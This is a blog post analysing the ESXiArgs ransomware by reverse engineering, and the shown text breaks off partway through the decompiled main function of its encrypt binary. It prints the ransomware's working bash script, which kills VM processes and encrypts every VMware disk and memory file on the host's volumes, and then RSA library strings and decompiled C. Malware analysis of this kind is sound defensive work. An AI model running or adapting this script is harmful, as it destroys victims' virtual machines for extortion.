<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Name Nguyen">
<meta name="description" content="Learning about how the ESXiArgs ransomware works through reverse engineering" />
<meta name="keywords" content="homepage, blog, malware, reverse engineering, security" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://namberino.github.io/en/english/posts/esxiargs-analysis/" />


    <title>
        
            ESXiArgs: An Analysis :: Nam&#39;s Journal 
        
    </title>





<link rel="stylesheet" href="/main.f328c18cc29e8f38ea9856605ac2b3d52498b99bcd296a7867e57a6cd4ba1ec8.css" integrity="sha256-8yjBjMKejzjqmFZgWsKz1SSYuZvNKWp4Z&#43;V6bNS6Hsg=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="ESXiArgs: An Analysis">
  <meta itemprop="description" content="Learning about how the ESXiArgs ransomware works through reverse engineering">
  <meta itemprop="datePublished" content="2024-04-01T14:42:54+07:00">
  <meta itemprop="dateModified" content="2024-04-01T14:42:54+07:00">
  <meta itemprop="wordCount" content="2909">
  <meta itemprop="image" content="https://namberino.github.io/">
  <meta itemprop="keywords" content="Malware,Reverse Engineering,Security">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://namberino.github.io/">
  <meta name="twitter:title" content="ESXiArgs: An Analysis">
  <meta name="twitter:description" content="Learning about how the ESXiArgs ransomware works through reverse engineering">



    <meta property="og:url" content="https://namberino.github.io/en/english/posts/esxiargs-analysis/">
  <meta property="og:site_name" content="Nam&#39;s Journal">
  <meta property="og:title" content="ESXiArgs: An Analysis">
  <meta property="og:description" content="Learning about how the ESXiArgs ransomware works through reverse engineering">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="english">
    <meta property="article:published_time" content="2024-04-01T14:42:54+07:00">
    <meta property="article:modified_time" content="2024-04-01T14:42:54+07:00">
    <meta property="article:tag" content="Malware">
    <meta property="article:tag" content="Reverse Engineering">
    <meta property="article:tag" content="Security">
    <meta property="og:image" content="https://namberino.github.io/">






    <meta property="article:published_time" content="2024-04-01 14:42:54 &#43;0700 &#43;07" />













<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
            delimiters: [
                {left: "$$", right: "$$", display: true},
                {left: "$", right: "$", display: false}
            ]
        });
    });
</script>


    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                nam$journal</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/en/about/">About</a></li><li><a href="/en/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
                <span class="theme-toggle not-selectable" style="margin-left: 1.5rem; margin-right: 1rem;">
	
        
            
            <a class="active language" style="text-decoration: underline;"> EN </a>
            
                <div style="margin-left: 0.12rem; margin-right: 0.12rem;"> | </div>
            
        
	
        
            
            
        
	

</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://namberino.github.io/en/english/posts/esxiargs-analysis/">ESXiArgs: An Analysis</a></h2>

            
            
            

            <div class="post-content">
                <p>Last year, a ransomware attack called <strong>ESXiArgs</strong> managed to encrypt hundreds of VMware machines in multiple different countries. And I decided to try my hands at reverse engineering and analyzing this malware to see how it works. So without further ado, let&rsquo;s reverse this.</p>
<blockquote>
<p>Note: The malware sample was provided by the <a href="https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14#entry5470686">bleepingcomputer forum</a></p>
</blockquote>
<h1 id="the-script">The script</h1>
<p>So right out of the gate, in the script, there&rsquo;s a section called <code>CHANGE CONFIG</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## CHANGE CONFIG</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> config_file in <span style="color:#c678dd">$(</span>esxcli vm process list | grep <span style="color:#98c379">&#34;Config File&#34;</span> | awk <span style="color:#98c379">&#39;{print $3}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;FIND CONFIG: </span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  sed -i -e <span style="color:#98c379">&#39;s/.vmdk/1.vmdk/g&#39;</span> -e <span style="color:#98c379">&#39;s/.vswp/1.vswp/g&#39;</span> <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$config_file</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>This will find the config files and changing the <code>vmdk</code> config files to <code>vswp</code> files. So nothing super interesting here.</p>
<p>In the next section, the script is stopping the <code>VMX</code> process:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## STOP VMX</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;KILL VMX&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">kill</span> -9 <span style="color:#c678dd">$(</span>ps | grep vmx | awk <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>
</span></span></code></pre></div><p>The <code>VMX</code> process is responsible for handling I/O devices. It is also responsible for communicating with user interfaces, snapshot managers, and remote console.</p>
<p>The next section is the &ldquo;meat&rdquo; of the malware, the <em>encrypt</em> section:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#7f848e">## ENCRYPT</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START VOLUME: </span><span style="color:#e06c75">$volume</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#39;\n&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#98c379">&#34;START ENCRYPT: </span><span style="color:#e06c75">$file_e</span><span style="color:#98c379"> SIZE: </span><span style="color:#e06c75">$size_kb</span><span style="color:#98c379"> STEP SIZE: </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379">&#34;</span> <span style="color:#98c379">&#34;\&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">\&#34; </span><span style="color:#e06c75">$size_step</span><span style="color:#98c379"> 1 </span><span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span><span style="color:#98c379">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">echo</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt; <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">.args&#34;</span>
</span></span><span style="display:flex;"><span>        nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">done</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">$&#34; &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">done</span>
</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> volume in <span style="color:#c678dd">$(</span><span style="color:#e06c75">IFS</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;\n&#39;</span> esxcli storage filesystem list | grep <span style="color:#98c379">&#34;/vmfs/volumes/&#34;</span> | awk -F<span style="color:#98c379">&#39;  &#39;</span> <span style="color:#98c379">&#39;{print $2}&#39;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>This 1st <code>for loop</code> is going through every volumes in the <code>/vmfs/volumes/</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">for</span> file_e in <span style="color:#c678dd">$(</span> find <span style="color:#98c379">&#34;/vmfs/volumes/</span><span style="color:#e06c75">$volume</span><span style="color:#98c379">/&#34;</span> -type f -name <span style="color:#98c379">&#34;*.vmdk&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmx&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmxf&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsd&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmsn&#34;</span> -o -name <span style="color:#98c379">&#34;*.vswp&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmss&#34;</span> -o -name <span style="color:#98c379">&#34;*.nvram&#34;</span> -o -name <span style="color:#98c379">&#34;*.vmem&#34;</span><span style="color:#c678dd">)</span>; <span style="color:#c678dd">do</span>
</span></span></code></pre></div><p>This 2nd <code>for loop</code> is going to try to find any files in those volumes with the following extensions:</p>
<ul>
<li><code>.vmdk</code></li>
<li><code>.vmx</code></li>
<li><code>.vmxf</code></li>
<li><code>.vmsd</code></li>
<li><code>.vmsn</code></li>
<li><code>.vswp</code></li>
<li><code>.vmss</code></li>
<li><code>.nvram</code></li>
<li><code>.vmem</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> -f <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$(</span>du -k <span style="color:#e06c75">$file_e</span> | awk <span style="color:#98c379">&#39;{print $1}&#39;</span><span style="color:#c678dd">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#e06c75">$size_kb</span> -eq <span style="color:#d19a66">0</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_kb</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">[[</span> <span style="color:#c678dd">$((</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#c678dd">))</span> -gt <span style="color:#d19a66">128</span> <span style="color:#56b6c2">]]</span>; <span style="color:#c678dd">then</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size_step</span><span style="color:#56b6c2">=</span><span style="color:#c678dd">$((</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">$size_kb</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1024</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">100</span><span style="color:#56b6c2">)-</span><span style="color:#d19a66">1</span><span style="color:#c678dd">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">fi</span>
</span></span></code></pre></div><p>This part of the script tries to determine the size of the files that it found in the 2nd <code>for loop</code>. The number of steps to encrypt the file (number of MB to skip) is derived from this file size.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nohup <span style="color:#e06c75">$CLEAN_DIR</span>/encrypt <span style="color:#e06c75">$CLEAN_DIR</span>/public.pem <span style="color:#98c379">&#34;</span><span style="color:#e06c75">$file_e</span><span style="color:#98c379">&#34;</span> <span style="color:#e06c75">$size_step</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">$((</span>size_kb*1024<span style="color:#c678dd">))</span> &gt;/dev/null 2&gt;&amp;1&amp;
</span></span></code></pre></div><p>The file path, file size and number of steps are passed into the <code>encrypt</code> binary. The <code>encrypt</code> binary looks to also take in a public key. Then all of that will get pumped into <code>/dev/null</code> to suppress command line output.</p>
<p>The script also calls <code>nohup</code> to execute this binary in the background. This is done to encrypt the files <em>concurrently</em>.</p>
<p>After researching about this malware, I learned that the malware author will leave an <code>encrypt</code> binary and a <code>decrypt</code> binary. The <code>decrypt</code> binary will require a <em>private key</em> that the victim will have to buy from the malware author (usually through bitcoin)</p>
<p>So the <code>encrypt</code> binary is the core of the malware. Let&rsquo;s try analyzing this binary and see how it works.</p>
<h1 id="the-encrypt-binary">The encrypt binary</h1>
<p>First of all, I ran the <code>file</code> command on the binary and got this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file encrypt
</span></span><span style="display:flex;"><span>encrypt: ELF 64-bit LSB executable, x86-64, version <span style="color:#d19a66">1</span> <span style="color:#56b6c2">(</span>SYSV<span style="color:#56b6c2">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#c678dd">for</span> GNU/Linux 2.6.8, with debug_info, not stripped
</span></span></code></pre></div><p>So we have an <code>ELF 64-bit</code> executable since this malware runs on x64 Intel processors. This is also <code>dynamically linked</code>, so this was probably compiled using standard <code>GCC</code> with no crazy flags.</p>
<p>This was also compiled for <code>GNU/Linux 2.6.8</code> which is a pretty old version of Linux.</p>
<p>The weird thing here is that the binary still has <code>debug_info not stripped</code>. Typically, malware authors would strip the binary of the debugging information which would make reverse engineering their malware a whole lot more difficult. This malware, however, still has all the debugging information as it has not been stripped. This means that all the functions still have the symbols and there&rsquo;s still information from <code>GCC</code> about how this program was compiled.</p>
<p>Next, I ran <code>strings</code> on the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings encrypt
</span></span></code></pre></div><p>Since the binary was not obfuscated, I started looking for anything related to encrypting and I found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>BIO_new_mem_buf
</span></span><span style="display:flex;"><span>ERR_get_error
</span></span><span style="display:flex;"><span>ERR_error_string
</span></span><span style="display:flex;"><span>PEM_read_bio_RSA_PUBKEY
</span></span><span style="display:flex;"><span>PEM_read_bio_RSAPrivateKey
</span></span><span style="display:flex;"><span>RAND_pseudo_bytes
</span></span><span style="display:flex;"><span>RSA_public_encrypt
</span></span><span style="display:flex;"><span>RSA_private_decrypt
</span></span><span style="display:flex;"><span>RSA_size
</span></span></code></pre></div><p><code>PEM_read_bio_RSA_PUBKEY</code> will read some file as a public key. <code>PEM_read_bio_RSAPrivateKey</code> will read some file as a private key. <code>RAND_pseudo_bytes</code> will generate a pseudo-random number, this will probably be used later on for encryption.</p>
<p>We also have <code>RSA_public_encrypt</code> and <code>RSA_private_decrypt</code>. So it looks like this is using <strong>RSA</strong> which is an <em>asymmetric encryption</em> algorithm.</p>
<p>If you don&rsquo;t know what <em>asymmetric encryption</em> is, imagine a mailbox. A mailbox is publically accessible and anyone can drop a letter in it. But only the owner who has the key to the mailbox can unlock it and read the mail in it.</p>
<p><em>Asymmetric encryption</em> is similar to that. It uses 2 keys, <em>public</em> and <em>private</em>. The public key will be handed out to other people. When someone wants to send data to you, they will use the public key that they got from you to encrypt the data and you will use your private key to decrypt the data. This is cryptographically safe because even if a hacker got a hold of the data and the public key, they wouldn&rsquo;t be able to do anything as the public key is useless when it comes to decrypting the data. The data, once encrypted with the public key, can only be decrypted with the private key.</p>
<p>So this binary will <code>RSA_public_encrypt</code> with a public key to encrypt the files and <code>RSA_private_decrypt</code> with a private key to decrypt the files.</p>
<p>Let&rsquo;s load this up into a disassembler to reverse engineer this.</p>
<h1 id="the-disassembling">The disassembling</h1>
<p>I&rsquo;ll be using <a href="https://ghidra-sre.org/">[<strong>Ghidra</strong>]</a> as my disassembler of choice.</p>

    <img src="/img/esxiargs-analysis/ghidra-esxiargs.png"  alt="ESXiArgs in Ghidra"  class="center"  style="padding: 10px"  />


<p>Here&rsquo;s the <code>main</code> function of the <code>encrypt</code> binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">main</span>(<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e5c07b">long</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_4c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_38</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_30</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">local_28</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_20</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">local_18</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">local_c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">3</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x18</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_28</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x20</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_30</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#d19a66">5</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">param_1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">atoi</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">**</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_38</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">init_libssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_c</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>),<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">local_18</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
